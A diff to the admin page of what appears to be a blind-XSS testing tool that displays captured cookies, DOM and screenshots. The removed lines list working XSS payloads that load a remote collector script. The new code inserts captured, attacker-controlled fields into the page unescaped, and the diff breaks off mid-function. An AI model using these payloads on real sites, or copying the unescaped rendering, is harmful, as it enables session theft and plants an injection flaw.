@@ -1,367 +1,219 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin Page</title>
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
     <style>
         body {
             background-color: #03396c;
             color: #b3cde0;
         }
-        
-        table, th, td {
-            border-collapse: collapse;
-            border: 1px solid #ddd;
-            /* background-color: #005b96; */
+
+        .navbar-custom {
+            background-color: #011f4b;
         }
 
-        th, td {
+        .navbar-custom .nav-link {
+            color: #b3cde0;
+        }
+
+        .navbar-custom .nav-link:hover {
+            color: #f0f0f0;
+        }
+
+        .table th, .table td {
             padding: 10px;
             text-align: left;
         }
 
-        th {
+        .table th {
             background-color: #011f4b;
             color: white;
         }
 
-        tr:nth-child(even) {
-            background-color: #004878;
-        }
-
-        tr:nth-child(odd) {
+        .table-striped tbody tr:nth-of-type(odd) {
             background-color: #005b96;
         }
 
-        input[type="text"] {
-            padding: 10px;
-            margin-bottom: 20px;
-            border: none;
-            border-radius: 5px;
-            width: 97%;
+        .table-striped tbody tr:nth-of-type(even) {
+            background-color: #004878;
         }
 
-        textarea {
-            padding: 10px;
-            margin-bottom: 20px;
-            border: none;
-            border-radius: 5px;
-            width: 97%;
-            height: 200px;
-        }
-
-        hr {
-            border: 1px solid #ddd;
-            margin: 20px 0;
-        }
-
-        .flex-table {
-            display: flex;
-            flex-direction: column;
-        }
-
-        .invisible {
-            display: none;
-        }
-
-        .value_cell {
-            width: 85%;
-        }
-
-        .navbar {
-            border-radius: 10px;
-            background-color: #011f4b;
-            color: white;
-            padding: 8px 5px;
-            border: none;
-            cursor: pointer;
-        }
-
-        .navbar:hover {
-            background-color: #00183c;
-        }
-        
-        .modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: scroll;
-        }
-
-        .modal_div {
+        input[type="text"], textarea {
             background-color: #03396c;
-            margin: auto;
-            padding: 20px;
-            width: 80%;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            overflow: auto;
+            color: #b3cde0;
+            border: 1px solid #b3cde0;
+            border-radius: 5px;
+            padding: 10px;
         }
 
-        .action_button {
+        .btn-custom {
             background-color: #6497b1;
             color: white;
-            padding: 10px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
         }
 
-        .action_button:hover {
-            /* background-color: #0056b3; */
+        .btn-custom:hover {
             background-color: #4a7d96;
         }
 
-        .payload_maker_button {
-            background-color: #6497b1;
-            color: white;
-            padding: 10px;
+        .modal-content {
+            background-color: #03396c;
+        }
+
+        .modal-header, .modal-footer {
             border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-right: 10px;
         }
 
-        .payload_maker_button:hover {
-            /* background-color: #0056b3; */
-            background-color: #4a7d96;
-        }
-
-        .status_good {
-            color: #28a745;
-        }
-
-        .status_bad {
-            color: #dc3545;
-        }
-
-        .close_button {
-            background-color: #dc3545;
+        .close-custom {
             color: white;
-            padding: 10px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            position: absolute;
-            right: 10%;
         }
 
-        .close_button:hover {
-            background-color: #c82333;
+        .close-custom:hover {
+            color: #f0f0f0;
         }
 
-        .payload_fires_title_cell {
-            font-weight: bold;
+        .form-control {
+            background-color: #03396c;
+            color: #b3cde0;
+            border: 1px solid #b3cde0;
         }
 
-        .payload_fires_cell {
-            padding: 10px;
-            border-bottom: 1px solid #dee2e6;
-        }
-
-        #settingsTable {
-            margin-bottom: 10px;
-        }
-
-        .settings_cell {
-            padding: 10px;
-            border-bottom: 1px solid #dee2e6;
-        }
-
-        .payload_div {
-            padding: 10px;
-            padding-bottom: 20px;
-            border-bottom: 1px solid #dee2e6;
-            overflow: auto;
-        }
-
-        .payload_title {
-            font-weight: bold;
-        }
-
-        .payload_description {
-            padding-bottom: 10px;
-        }
-
-        .payload_code {
-            padding: 10px;
-            border: 1px solid #dee2e6;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        .payload_code:hover {
-            background-color: #00183c;
-        }
-
-        .payload_author {
-            cursor: pointer;
-            text-decoration: underline;
-            margin-bottom: 0px;
-            margin-top: 0px;
-        }
-
-        .payload_author:hover {
-            color: #007bff;
-        }
-
-        .modal_element_div {
-            padding-top: 4px;
-            padding-bottom: 4px;
-            overflow: scroll;
-
-        }
-
-        .modal_element_label {
-            display: inline;
-            font-weight: bold;
-        }
-
-        .modal_element_item {
-            display: inline;
-        }
-
-        .image {
-            background-color: white;
-        }
-
-        .thumbnail {
-            background-color: white;
-            width: 100px;
-            height: 100px;
-        }
-
-        .update_div {
-            display: flex;
-            padding: 5px;
-            margin-bottom: 20px;
-            background-color: #011f4b;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-        }
-
-        .update_header {
-            font-weight: 600;
-            /* color: #03396c; */
-        }
-
-        .user_payload_header {
-            margin-top: 5px;
-        }
-
-        .payload_legend {
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            margin-bottom: 10px;
-        }
-
-        .user_payloads_legend {
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            margin-bottom: 10px;
-            /* make it scroll if overflow */
-            overflow: auto;
-        }
-
-        .payload_example {
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            margin-bottom: 10px;
-        }
-
-        .exported_payloads {
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            margin-bottom: 10px;
-            overflow: auto;
-            cursor: pointer;
-        }
-
-        .exported_payloads:hover {
-            background-color: #00183c;
+        .form-control:focus {
+            background-color: #03396c;
+            color: #b3cde0;
         }
     </style>
 </head>
 <body>
-    <div id="navvar">
-        <button class="navbar" onclick="navbar('payload_fires')">Payload Fires</button>
-        <button class="navbar" onclick="navbar('collected_pages')">Collected Pages</button>
-        <button class="navbar" onclick="navbar('settings')">Settings</button>
-        <button class="navbar" onclick="navbar('payloads')">Payloads</button>
-        <button class="navbar" onclick="navbar('payload_maker')">Payload Maker</button>
-        <button class="navbar" onclick="navbar('payload_import_export')">Payload Importer/Exporter</button>
-    </div>
-    <div id="payload_fires" class="flex-table">
-        <div>
-            <h1>Admin Page</h1>
-            <button class="action_button" onclick="refreshPayloadFires()">Refresh</button>
+    <nav class="navbar navbar-expand-lg navbar-custom">
+        <a class="navbar-brand text-white" href="#">Admin Panel</a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon text-white">☰</span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarNav">
+            <ul class="navbar-nav ml-auto">
+                <li class="nav-item">
+                    <a class="nav-link" href="#" onclick="navbar('payload_fires')">Payload Fires</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="#" onclick="navbar('collected_pages')">Collected Pages</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="#" onclick="navbar('settings')">Settings</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="#" onclick="navbar('payloads')">Payloads</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="#" onclick="navbar('payload_maker')">Payload Maker</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="#" onclick="navbar('payload_import_export')">Payload Importer/Exporter</a>
+                </li>
+            </ul>
         </div>
-        
+    </nav>
 
+    <div id="payload_fires" class="container mt-4">
+        <div class="d-flex justify-content-between align-items-center mb-3">
+            <h1>Admin Page</h1>
+            <button class="btn btn-custom" onclick="refreshPayloadFires()">Refresh</button>
+        </div>
         <div id="special_update_div"></div>
-        <table class="payload_fires_table" id="payloadFiresTable">
-            <tr class="payload_fires_header">
-                <th class="payload_fires_title_cell">ID</th>
-                <th class="payload_fires_title_cell">URI</th>
-                <th class="payload_fires_title_cell">Image</th>
-                <th class="payload_fires_title_cell">Expand</th>
-            </tr>
+        <table class="table table-striped table-bordered" id="payloadFiresTable">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>URI</th>
+                    <th>Image</th>
+                    <th>Expand</th>
+                </tr>
+            </thead>
+            <tbody></tbody>
         </table>
-        <div id="payload_fires_page_buttons">
-            <button id="payload_fires_next_button" class="action_button" onclick="changePagePayloadFires(1)">Next Page</button>
+        <div id="payload_fires_page_buttons" class="d-flex justify-content-end">
+            <button id="payload_fires_next_button" class="btn btn-custom" onclick="changePagePayloadFires(1)">Next Page</button>
         </div>
     </div>
-    <div id="collected_pages" class="flex-table invisible">
-        <div>
+
+    <div id="collected_pages" class="container mt-4 d-none">
+        <div class="d-flex justify-content-between align-items-center mb-3">
             <h1>Collected Pages</h1>
-            <button class="action_button" onclick="refreshCollectedPages()">Refresh</button>
+            <button class="btn btn-custom" onclick="refreshCollectedPages()">Refresh</button>
         </div>
-        <table id="pagesTable">
-            <tr>
-                <th>ID</th>
-                <th>URI</th>
-                <th>Action</th>
-            </tr>
+        <table class="table table-striped table-bordered" id="pagesTable">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>URI</th>
+                    <th>Action</th>
+                </tr>
+            </thead>
+            <tbody></tbody>
         </table>
-        <div id="collected_pages_page_buttons">
-            <button id="collected_pages_next_button" class="action_button" onclick="changePageCollectedPages(1)">Next Page</button>
+        <div id="collected_pages_page_buttons" class="d-flex justify-content-end">
+            <button id="collected_pages_next_button" class="btn btn-custom" onclick="changePageCollectedPages(1)">Next Page</button>
         </div>
     </div>
-    <div id="settings" class="flex-table invisible">
+
+    <div id="settings" class="container mt-4 d-none">
         <h1>Settings</h1>
         <div id="update_container"></div>
         <form id="settings_form">
-            <table id="settingsTable">
-                <tr>
-                    <th>Key</th>
-                    <th>Value</th>
-                </tr>
+            <table class="table table-striped table-bordered" id="settingsTable">
+                <thead>
+                    <tr>
+                        <th>Key</th>
+                        <th>Value</th>
+                    </tr>
+                </thead>
+                <tbody></tbody>
             </table>
-            <input class="action_button" type="submit" value="Save">
+            <button class="btn btn-custom" type="submit">Save</button>
         </form>
     </div>
-    <div id="payloads" class="flex-table invisible">
-        <h1 style="margin-bottom:0px;">Payloads</h1>
-        <h3 style="margin:0px;">Click Desired Payload to Copy to Clipboard</h3>
-        <div id="payloadsTable">
+
+    <div id="payloads" class="container mt-4 d-none">
+        <h1>Payloads</h1>
+        <h3>Click Desired Payload to Copy to Clipboard</h3>
+        <div id="payloadsTable" class="table-responsive"></div>
+    </div>
+
+    <div id="payload_maker" class="container mt-4 d-none">
+        <h1>Payload Maker</h1>
+        <!-- Payload Maker Content -->
+    </div>
+
+    <div id="payload_import_export" class="container mt-4 d-none">
+        <h1>Payload Importer/Exporter</h1>
+        <!-- Payload Importer/Exporter Content -->
+    </div>
+
+    <!-- Modal Template -->
+    <div class="modal fade" id="modalTemplate" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Payload Fire</h5>
+                    <button type="button" class="close close-custom" data-dismiss="modal" aria-label="Close">
+                        <span aria-hidden="true">&times;</span>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <!-- Modal Content -->
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-custom" data-dismiss="modal">Close</button>
+                </div>
+            </div>
         </div>
     </div>
-    <div id="payload_maker" class="flex-table invisible">
-        <h1>Payload Maker</h1>
-    </div>
-    <div id="payload_import_export" class="flex-table invisible">
-        <h1>Payload Importer/Exporter</h1>
-    </div>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
     <script>
         function loadPayloadFires() {
             var page = 1;
@@ -374,149 +226,64 @@
             })
             .then(response => response.json())
             .then(data => {
-                const table = document.getElementById('payloadFiresTable');
+                const tableBody = document.querySelector('#payloadFiresTable tbody');
+                tableBody.innerHTML = '';
                 data.forEach(item => {
-                    const row = make_table_row(table, 'payload_fires_row');
-                    make_table_cell(item.id, row, 'payload_fires_cell');
-                    make_table_cell(item.url, row, 'payload_fires_cell');
-                    make_table_cell(null, row, 'payload_fires_cell').appendChild(make_image(item.screenshot_id, 'Screenshot', null, 'thumbnail'));
-                    const actionCell = make_table_cell(null, row, 'payload_fires_cell');
- 
+                    const row = tableBody.insertRow();
+                    row.insertCell().textContent = item.id;
+                    row.insertCell().textContent = item.url;
+                    const imgCell = row.insertCell();
+                    const img = document.createElement('img');
+                    img.src = `/screenshots/${item.screenshot_id}.png`;
+                    img.alt = 'Screenshot';
+                    img.classList.add('img-thumbnail', 'thumbnail');
+                    imgCell.appendChild(img);
+                    const actionCell = row.insertCell();
                     const expandButton = document.createElement('button');
-                    if (item.injection_requests_id !== null) {
-                        expandButton.id = `injection-request-id-${item.injection_requests_id}`
-                    }
+                    expandButton.className = 'btn btn-custom';
                     expandButton.textContent = 'Expand';
-                    expandButton.className = 'action_button';
-                    expandButton.onclick = function() {
-                        expandPayloadFire(item);
-                    };
+                    expandButton.onclick = () => expandPayloadFire(item);
                     actionCell.appendChild(expandButton);
-                    
                 });
             });
         }
 
         function refreshPayloadFires() {
-            const table = document.getElementById('payloadFiresTable');
-            while (table.rows.length > 1) {
-                table.deleteRow(1);
-            }
             loadPayloadFires();
         }
 
         function changePagePayloadFires(pageIncrement) {
             state.payload_fires_page += pageIncrement;
-            
-            if (state.payload_fires_page == 1) {
+            if (state.payload_fires_page < 1) {
                 state.payload_fires_page = 1;
-                const previousButton = document.getElementById('payload_fires_previous_button');
-                if (previousButton) {
-                    previousButton.remove();
-                }
-            } else {
-                const previousButtonOrigin = document.getElementById('payload_fires_previous_button');
-                if (!previousButtonOrigin) {
-                    const nextButton = document.getElementById('payload_fires_next_button');
-                    const previousButton = make_element('button', 'Previous Page', null, 'action_button', function() {
-                        changePagePayloadFires(-1);
-                    });
-                    previousButton.id = 'payload_fires_previous_button';
-
-                    nextButton.parentNode.insertBefore(previousButton, nextButton);
-                }
             }
             refreshPayloadFires();
         }
 
         function expandPayloadFire(payloadFire) {
-            const modal = make_modal('modal');
-
-            const modalContent = make_div('modal_div', modal);
-            make_element('button', 'Close', modalContent, 'close_button', modal.remove.bind(modal));
-
-            make_element('h2', 'Payload Fire', modalContent);
-
-            make_modal_element('b', 'p', `ID: `, payloadFire.id, modalContent);
-            make_modal_element('b', 'p', `URL: `, payloadFire.url, modalContent);
-            make_image(payloadFire.screenshot_id, payloadFire.screenshot_id, modalContent, 'image');
-            make_modal_element('b', 'p', `IP Address: `, payloadFire.ip_address, modalContent);
-            make_modal_element('b', 'p', `Referer: `, payloadFire.referer, modalContent);
-            make_modal_element('b', 'p', `User Agent: `, payloadFire.user_agent, modalContent);
-            make_modal_element('b', 'p', `Cookies: `, payloadFire.cookies, modalContent);
-            make_modal_element('b', 'p', `Title: `, payloadFire.title, modalContent);
-            make_modal_element('b', 'code', 'DOM: ', payloadFire.dom, modalContent);
-            make_modal_element('b', 'p', `Text: `, payloadFire.text, modalContent);
-            make_modal_element('b', 'p', `Origin: `, payloadFire.origin, modalContent);
-            make_modal_element('b', 'p', `Was Iframe: `, payloadFire.was_iframe, modalContent);
-            make_modal_element('b', 'p', `Browser Timestamp: `, payloadFire.browser_timestamp, modalContent);
-            make_modal_element('b', 'p', `Correlated Request: `, payloadFire.correlated_request, modalContent);
-
-            // make_element('button', 'Close', modalContent, 'close_button', modal.remove.bind(modal));
-
-            document.body.appendChild(modal);
-        }
-
-        function deletePayloadFire(id) {
-            console.log('deletePayloadFire', id)
-            // var form_data = new FormData();
-            // form_data.append("ids", id);
-
-            // fetch('/api/v1/payloadfires', {
-            //     method: 'DELETE',
-            //     body: form_data
-            // })
-            // .then(() => {
-            //     // Reload the page to get the updated list
-            //     location.reload();
-            // });
-        }
-
-        function loadVersion(onload = false) {
-            const settings_div = document.getElementById('settings');
-            const update_container = document.getElementById('update_container');
-            const update_div = document.getElementById('update_div');
-            const special_update_div = document.getElementById('special_update_div');
-            
-            if (update_div) {
-                update_div.remove();
-            }
-
-            fetch('/api/v1/version', {
-                method: 'GET',
-                headers: {
-                    'Content-Type': 'application/json'
-                }
-            })
-            .then(response => response.json())
-            .then(data => {
-                const parent_div = onload ? special_update_div : update_container;
-                const div = make_div('update_div', parent_div);
-                div.id = 'update_div';
-
-                if (data.current_git_commit != data.latest_git_commit) {
-                    make_element('h2', `Update Available on ${data.git_branch}`, div, 'update_header');
-                } else if (!onload) {
-                    make_element('button', 'Check for Updates', div, 'action_button', function() {
-                        loadVersion();
-                    });
-                    make_element('p', `    Current Version on ${data.git_branch}`, div);
-                } else {
-                    div.remove();
-                }
-            });
+            const modal = $('#modalTemplate');
+            modal.find('.modal-body').html(`
+                <p><strong>ID:</strong> ${payloadFire.id}</p>
+                <p><strong>URL:</strong> ${payloadFire.url}</p>
+                <img src="/screenshots/${payloadFire.screenshot_id}.png" class="img-fluid mb-3" alt="Screenshot">
+                <p><strong>IP Address:</strong> ${payloadFire.ip_address}</p>
+                <p><strong>Referer:</strong> ${payloadFire.referer}</p>
+                <p><strong>User Agent:</strong> ${payloadFire.user_agent}</p>
+                <p><strong>Cookies:</strong> ${payloadFire.cookies}</p>
+                <p><strong>Title:</strong> ${payloadFire.title}</p>
+                <pre><strong>DOM:</strong> ${payloadFire.dom}</pre>
+                <p><strong>Text:</strong> ${payloadFire.text}</p>
+                <p><strong>Origin:</strong> ${payloadFire.origin}</p>
+                <p><strong>Was Iframe:</strong> ${payloadFire.was_iframe}</p>
+                <p><strong>Browser Timestamp:</strong> ${payloadFire.browser_timestamp}</p>
+                <p><strong>Correlated Request:</strong> ${payloadFire.correlated_request}</p>
+            `);
+            modal.modal('show');
         }
 
         function loadSettings() {
-            if (state.settings) {
-                return;
-            }
+            if (state.settings) return;
             state.settings = 1;
-            
-            const table = document.getElementById('settingsTable');
-
-            loadVersion();
-
             fetch('/api/v1/settings', {
                 method: 'GET',
                 headers: {
@@ -525,318 +292,34 @@
             })
             .then(response => response.json())
             .then(data => {
+                const tableBody = document.querySelector('#settingsTable tbody');
+                tableBody.innerHTML = '';
                 for (const [key, value] of Object.entries(data)) {
-                    state.settings_form[key] = value;
+                    const row = tableBody.insertRow();
+                    row.insertCell().textContent = key;
+                    const valueCell = row.insertCell();
                     if (key === 'SEND_ALERTS') {
-                        state.settings_form[key] = value === 'true';
+                        const checkbox = document.createElement('input');
+                        checkbox.type = 'checkbox';
+                        checkbox.checked = value === 'true';
+                        valueCell.appendChild(checkbox);
+                    } else {
+                        const input = document.createElement('input');
+                        input.type = 'text';
+                        input.value = value;
+                        valueCell.appendChild(input);
                     }
-                    const row = make_table_row(table, 'settings_row');
-                    make_settings_table_cell(row, key, value, 'settings_cell');
                 }
             });
         }
 
-        document.getElementById('settings_form').addEventListener('submit', function(event) {
-            event.preventDefault();
-            var inputs = document.getElementById('settingsTable').getElementsByTagName('input');
-            for (var i = 0; i < inputs.length; i++) {
-                var form_data = new FormData();
-                var input = inputs[i];
-                var value = input.type === 'checkbox' ? input.checked : input.value;
-                if (state.settings_form[input.id] === value) {
-                    continue;
-                }
-                form_data.append('key', input.id);
-                form_data.append('value', value);
-                fetch('/api/v1/settings', {
-                    method: 'PUT',
-                    body: form_data
-                })
-            }
-        });
-
-        const domain = window.location.origin;
-        const hasHTTPS = domain.startsWith('https://');
-        const domainWithoutProtocol = window.location.hostname + (window.location.port ? ':' + window.location.port : '');
-        const domainBase64 = btoa(`var a=document.createElement("script");a.src="${domain}";document.body.appendChild(a);`).replace(/=/g, '');
-        const domainHTMLEncode = "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112" + (hasHTTPS ? ";&#115" : "") + ";&#58;&#47;&#47;" + domainWithoutProtocol + "&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;";
-
-
-        function makePayloadsTable() {
-            if (state.payloads) {
-                return;
-            }
-            state.payloads = 1;
-            var payloadsTable = document.getElementById('payloadsTable');
-            var payloads = [
-                { title: 'Basic Payload', description: 'This is a basic payload', payload: '%27%22%3Cscript%20src%3D%27/script_domain/%27%3E%3C%2Fscript%3E', is_static: true },
-                { title: 'Javascript URI', description: 'This is a payload that uses a javascript URI', payload: 'javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%5C%27script%5C%5C%27%29%3Ba.src%3D%5C%5C%27/script_domain/%5C%5C%27%3Bdocument.body.appendChild%28a%29%27%29', is_static: true },
-                { title: 'IMG Error', description: 'Payload triggers on img error', payload: '%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28this.id%29%29%20id%3D%22/script_base64/%22%3E', is_static: true },
-                // { title: 'IMG error', description: 'Payload triggers on img error', payload: '%27%22%3E%3Cimg%20src%3Dx%20id%3D/script_base64/%20onerror%3Deval%28atob%28this.id%29%29%3E', is_static: true },
-                { title: 'Input Tag Payload', description: 'HTML5 input-based payload', payload: '%27%22%3E%3Cinput%20onfocus%3Deval%28atob%28this.id%29%29%20id%3D/script_base64/%20autofocus%3E', is_static: true },
-                // { title: 'Video Source Payload', description: 'Video Source payload', payload: '%27%22%3E%3Cvideo%3E%3Csource%20onerror%3Deval%28atob%28this.id%29%29%20id%3D/script_base64/%3E', is_static: true },
-                // { title: 'Iframe with HTML entities', description: 'Iframe that uses HTML Entities', payload: '%27%22%3E%3Ciframe%20srcdoc%3D%22/script_htmlencode/%22%3E', is_static: true },
-                { title: 'Jquery Payload', description: 'Payload exclusive to jquery', payload: '%3Cscript%3E%24.getScript%28%22/script_domain/%22%29%3C%2Fscript%3E', is_static: true },
-                // { title: 'CSP Bypass', author: '@BRuteLogic', author_link: 'https://twitter.com/BRuteLogic', description: 'Payload against "script-src"', payload: '%3CIframe%20SrcDoc%3D%0A%22%3CScript%20Src%3D/script_domain/%3E%3C%2FScript%3E%22%3E'}
-            ];
-
-            fetch('/api/v1/user_payloads', {
-                method: 'GET',
-                headers: {
-                    'Content-Type': 'application/json'
-                }
-            })
-            .then(response => response.json())
-            .then(data => {
-                payloads = payloads.concat(data);
-                payloads.forEach(payload => {
-                    var URIPayload = decode_payload(payload.payload);
-                    var payloadDiv = make_div('payload_div', payloadsTable);
-                    make_element('h2', payload.title, payloadDiv, 'payload_title');
-                    var description = make_element('p', payload.description, payloadDiv, 'payload_description');
-                    if (payload.author) {
-                        var author = make_element('p', `By ${payload.author} `, description, 'payload_author', function() {
-                            window.open(payload.author_link, '_blank');
-                        });
-                    }
-                    make_element('code', URIPayload, payloadDiv, 'payload_code', function() {
-                        copyToClipboard(URIPayload);
-                    });
-                    if (!payload.is_static) {
-                        payloadDiv.id = payload.id;
-                        var deleteButton = make_element('button', 'Delete', payloadDiv, 'action_button', function() {
-                            deletePayload(payload.id);
-                        });
-                    }
-
-                });
-            });
-        }
-
-        function encode_payload(payload) {
-            payload = encodeURIComponent(payload);
-            payload = payload.replace('%2Fscript_domain%2F', '/script_domain/');
-            payload = payload.replace('%2Fscript_hostname%2F', '/script_hostname/');
-            payload = payload.replace('%2Fscript_base64%2F', '/script_base64/');
-            payload = payload.replace('%2Fscript_htmlencode%2F', '/script_htmlencode/');
-            return payload;
-        }
-
-        function decode_payload(payload) {
-            processedPayload = payload.replace('/script_domain/', domain);
-            processedPayload = processedPayload.replace('/script_hostname/', domainWithoutProtocol);
-            processedPayload = processedPayload.replace('/script_base64/', domainBase64);
-            processedPayload = processedPayload.replace('/script_htmlencode/', domainHTMLEncode);
-            return decodeURIComponent(processedPayload);
-        }
-
-        function deletePayload(id) {
-            var form_data = new FormData();
-            form_data.append("ids", id);
-
-            fetch('/api/v1/user_payloads', {
-                method: 'DELETE',
-                body: form_data
-            })
-            .then(() => {
-                div = document.getElementById(id);
-                div.remove();
-            });
-        }
-
-        function makePayloadMaker() {
-            if (state.payload_maker) {
-                return;
-            }
-            state.payload_maker = 1;
-            var payloadMaker = document.getElementById('payload_maker');
-
-            payloadLegend = make_div('payload_legend', payloadMaker);
-            make_element('h4', 'Payload Legend', payloadLegend, 'user_payload_header');
-
-            payloadDomain = make_div('user_payloads_legend', payloadLegend);
-            make_element('label', '/script_domain/ becomes ', payloadDomain)
-            make_element('code', domain, payloadDomain);
-
-            payloadHostname = make_div('user_payloads_legend', payloadLegend);
-            make_element('label', '/script_hostname/ becomes ', payloadHostname)
-            make_element('code', domainWithoutProtocol, payloadHostname);
-
-            payloadBase64 = make_div('user_payloads_legend', payloadLegend);
-            make_element('label', '/script_base64/ becomes ', payloadBase64)
-            make_element('code', domainBase64, payloadBase64);
-
-            payloadHTMLEncode = make_div('user_payloads_legend', payloadLegend);
-            make_element('label', '/script_htmlencode/ becomes ', payloadHTMLEncode)
-            make_element('code', domainHTMLEncode, payloadHTMLEncode);
-
-            make_element('p', 'All payloads will become URL encoded when stored in the database and during the making of the payload anything between / and / will be replaced with the appropriate value.', payloadLegend);
-
-            var status_div = make_div('status', payloadMaker);
-            var status = make_element('p', '', status_div);
-
-            var payload_example_div = make_div('payload_example', payloadMaker);
-            make_element('button', 'Copy to Clipboard', payload_example_div, 'payload_maker_button', function() {
-                // Custom function to copy to clipboard based on the id so it has to find the element by id
-                var text = document.getElementById('payload_code').textContent;
-                copyToClipboard(text);
-            });
-            var payload_example = make_element('code', '', payload_example_div);
-            payload_example.id = 'payload_code';
-            
-
-            var payloadMakerForm = make_element('form', null, payloadMaker);
-            payloadMakerForm.id = 'payload_maker_form';
-
-            make_element('button', 'Add /script_domain/', payloadMakerForm, 'payload_maker_button', function(event) {
-                event.preventDefault();
-                var input = payloadMakerForm.getElementsByTagName('input')[0];
-                input.value += '/script_domain/';
-            });
-            make_element('button', 'Add /script_hostname/', payloadMakerForm, 'payload_maker_button', function(event) {
-                event.preventDefault();
-                var input = payloadMakerForm.getElementsByTagName('input')[0];
-                input.value += '/script_hostname/';
-            });
-            make_element('button', 'Add /script_base64/', payloadMakerForm, 'payload_maker_button', function(event) {
-                event.preventDefault();
-                var input = payloadMakerForm.getElementsByTagName('input')[0];
-                input.value += '/script_base64/';
-            });
-            make_element('button', 'Add /script_htmlencode/', payloadMakerForm, 'payload_maker_button', function(event) {
-                event.preventDefault();
-                var input = payloadMakerForm.getElementsByTagName('input')[0];
-                input.value += '/script_htmlencode/';
-            });
-
-            make_element('br', null, payloadMakerForm)
-
-            make_element('label', 'Payload: ', payloadMakerForm);
-            payload_input = make_element('input', null, payloadMakerForm)
-            payload_input.type = 'text';
-            payload_input.id = 'payload_input';
-            payload_input.required = true;
-            payload_input.onchange = function() {
-                console.log('change')
-                var example_payload = encode_payload(payload_input.value);
-                payload_example.textContent = decode_payload(example_payload);
-            }
-
-            make_element('label', 'Title: ', payloadMakerForm);
-            make_element('input', null, payloadMakerForm).type = 'text';
-            make_element('label', 'Description: ', payloadMakerForm);
-            make_element('input', null, payloadMakerForm).type = 'text';
-            make_element('label', 'Author: ', payloadMakerForm);
-            make_element('input', null, payloadMakerForm).type = 'text';
-            make_element('label', 'Author Link: ', payloadMakerForm);
-            make_element('input', null, payloadMakerForm).type = 'text';
-            make_element('input', null, payloadMakerForm, 'action_button').type = 'submit';
-
-            payloadMakerForm.addEventListener('submit', function(event) {
-                event.preventDefault();
-                status.textContent = '';
-                status.className = '';
-                var input = payloadMakerForm.getElementsByTagName('input')[0];
-                if (!input.value) {
-                    status.textContent = 'Payload is required';
-                    status.className = 'status_bad';
-                    return;
-                }
-                var payload = encode_payload(input.value);
-
-                var form_data = new FormData();
-                form_data.append('payload', payload);
-                form_data.append('title', payloadMakerForm.getElementsByTagName('input')[1].value);
-                form_data.append('description', payloadMakerForm.getElementsByTagName('input')[2].value);
-                form_data.append('author', payloadMakerForm.getElementsByTagName('input')[3].value);
-                form_data.append('author_link', payloadMakerForm.getElementsByTagName('input')[4].value);
-
-                fetch('/api/v1/user_payloads', {
-                    method: 'POST',
-                    body: form_data
-                })
-                .then(() => {
-                    status.textContent = 'Payload Added';
-                    status.className = 'status_good';
-                    payload_example.textContent = '';
-                });
-            });
-        }
-
-        function makePayloadImporterExporter() {
-            if (state.payload_import_export) {
-                return;
-            }
-            state.payload_import_export = 1;
-            var payload_import_export = document.getElementById('payload_import_export');
-
-            var payload_import_export_form = make_element('form', null, payload_import_export);
-            payload_import_export_form.id = 'payload_import_export_form';
-
-            make_element('label', 'Import Payloads: ', payload_import_export_form);
-            var import_input = make_element('textarea', null, payload_import_export_form);
-            import_input.required = true;
-
-            make_element('input', null, payload_import_export_form, 'action_button').type = 'submit';
-
